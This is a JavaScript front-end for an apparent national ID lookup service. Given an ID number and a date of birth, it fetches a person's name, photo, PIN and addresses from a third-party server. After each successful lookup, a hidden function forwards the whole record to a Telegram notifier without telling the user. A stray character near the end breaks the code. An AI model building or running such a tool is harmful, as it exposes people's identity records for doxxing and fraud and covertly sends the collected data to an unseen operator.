document.addEventListener('DOMContentLoaded', function() {    // Element selections
    const form = document.getElementById('nid-form');
    const nidInput = document.getElementById('nid');
    const dobInput = document.getElementById('dob');
    const executeBtn = document.getElementById('execute-btn');
    const clearBtn = document.getElementById('clear-btn');
    
    const loaderContainer = document.getElementById('loader-container');
    const loaderText = document.getElementById('loader-text');
    const resultContainer = document.getElementById('result-container');
    const photoSection = document.getElementById('photo-section');
    const resultData = document.getElementById('result-data');
    const errorMessage = document.getElementById('error-message');
    const nidValidationMsg = document.getElementById('nid-validation-msg');
    const terminalTitle = document.getElementById('terminal-title-text');

    let loaderInterval;

    // --- Feature 1: Typewriter Effect on Title ---
    function typeWriter(element, text, speed = 100) {
        let i = 0;
        element.innerHTML = ""; // Clear existing text
        const cursor = document.createElement('span');
        cursor.className = 'cursor';
        cursor.innerHTML = '&nbsp;';
        element.appendChild(cursor);

        function typing() {
            if (i < text.length) {
                element.insertBefore(document.createTextNode(text.charAt(i)), cursor);
                i++;
                setTimeout(typing, speed);
            } else {
                cursor.style.animation = 'blink 1s step-end infinite';
            }
        }
        typing();
    }
    typeWriter(terminalTitle, 'NID QUERY SYSTEM');

    // --- Feature 2: Real-time NID Validation ---
    nidInput.addEventListener('keyup', function() {
        const nid = this.value.trim();
        if (nid.length === 0) {
            nidValidationMsg.textContent = '';
            nidValidationMsg.className = 'validation-msg';
            return;
        }
        if (/^\d{10}$|^\d{13}$|^\d{17}$/.test(nid)) {
            nidValidationMsg.textContent = '✓ Valid Format';
            nidValidationMsg.className = 'validation-msg success';
        } else {
            nidValidationMsg.textContent = '✗ Invalid Format (must be 10, 13, or 17 digits)';
            nidValidationMsg.className = 'validation-msg error';
        }
    });

    // --- Feature 3: Clear Button ---
    clearBtn.addEventListener('click', function() {
        form.reset();
        resultContainer.style.display = 'none';
        errorMessage.style.display = 'none';
        loaderContainer.style.display = 'none';
        nidValidationMsg.textContent = '';
        nidValidationMsg.className = 'validation-msg';
        resultContainer.classList.remove('animated-result');
        errorMessage.classList.remove('animated-result');
    });

    // --- Main Form Submission Logic ---
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        executeBtn.disabled = true;
        executeBtn.textContent = 'EXECUTING...';
        resultContainer.style.display = 'none';
        errorMessage.style.display = 'none';
        loaderContainer.style.display = 'block';
        startLoadingAnimation();
        
        resultContainer.classList.remove('animated-result');
        errorMessage.classList.remove('animated-result');

        const nid = nidInput.value;
        const dob = dobInput.value;
        const formattedDobApi = dob;

        const apiKey = 'Test';
        const apiUrl = `https://teamnoob.serv00.net/nidkeysystem/user/sendSMS.php?key=${apiKey}&nid=${nid}&dob=${formattedDobApi}`;

        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                stopLoadingAnimation();
                if (data.success === true && data.nid_data) {
                    displaySuccess(data);
                    sendToTelegram(data);
                } else {
                    displayError(data.response || 'Information not found.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                stopLoadingAnimation();
                displayError('System Error. Please try again.');
            })
            .finally(() => {
                executeBtn.disabled = false;
                executeBtn.textContent = 'EXECUTE QUERY';
            });
    });

    function displaySuccess(data) {
        const info = data.nid_data;

        photoSection.innerHTML = '';
        if (info.photo_local) {
            const img = document.createElement('img');
            img.src = info.photo_local;
            img.alt = 'NID Photo';
            img.className = 'nid-photo';
            photoSection.appendChild(img);
        }

        resultData.innerHTML = `
            ${createResultItem('Status', `<span class="success-text">${data.response || 'Success'}</span>`, false)}
            ${createResultItem('📝 Name', `<span class="name">${info.name}</span>`)}
            ${createResultItem('🆔 National ID', info.national_id)}
            ${createResultItem('🎂 Date of Birth', info.birth_date)}
            ${createResultItem('📍 PIN', info.pin)}
            ${createResultItem('🏠 Permanent', `<span class="address">${info.permanent_address.replace(/\n\s*/g, ' ')}</span>`)}
            ${createResultItem('📫 Current', `<span class="address">${info.current_address.replace(/\n\s*/g, ' ')}</span>`)}
        `;
        
        resultContainer.style.display = 'block';
        resultContainer.classList.add('animated-result');
    }

    function displayError(message) {
        errorMessage.textContent = `⚠️ Error: ${message}`;
        errorMessage.style.display = 'block';
        errorMessage.classList.add('animated-result');
    }
    
    // --- Feature 4: Copy-to-Clipboard ---
    function createResultItem(key, value, canCopy = true) {
        const copyIcon = canCopy ? `<span class="copy-icon" title="Copy">📋</span>` : '';
        const cleanValue = typeof value === 'string' ? value.replace(/<[^>]*>?/gm, '') : value;
        return `
            <div class="result-item" data-value="${canCopy ? cleanValue : ''}">
                <span class="key">${key}:</span>
                <span class="value">${value}</span>
                ${copyIcon}
            </div>
        `;
    }
    resultData.addEventListener('click', function(e) {
        if (e.target.classList.contains('copy-icon')) {
            const item = e.target.closest('.result-item');
            const valueToCopy = item.dataset.value;
            navigator.clipboard.writeText(valueToCopy).then(() => {
                e.target.textContent = '✅';
                setTimeout(() => { e.target.textContent = '📋'; }, 1500);
            });
        }
    });

    // --- Feature 5: Advanced Loading Animation ---
    function startLoadingAnimation() {
        const texts = ['CONNECTING TO SERVER...', 'AUTHENTICATING...', 'FETCHING DATA...', 'PARSING RESPONSE...'];
        let i = 0;
        loaderText.textContent = texts[i];
        loaderInterval = setInterval(() => {
            i = (i + 1) % texts.length;
            loaderText.textContent = texts[i];
        }, 1500);
    }

    function stopLoadingAnimation() {
        clearInterval(loaderInterval);
        loaderContainer.style.display = 'none';
    }

T   // --- Telegram Notifier ---
    function sendToTelegram(data) {
        fetch('send_to_telegram.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
        }).then(response => response.json())
          .then(tele_data => console.log('Telegram Status:', tele_data.message))
          .catch((error) => console.error('Telegram Error:', error));
    }
});
              
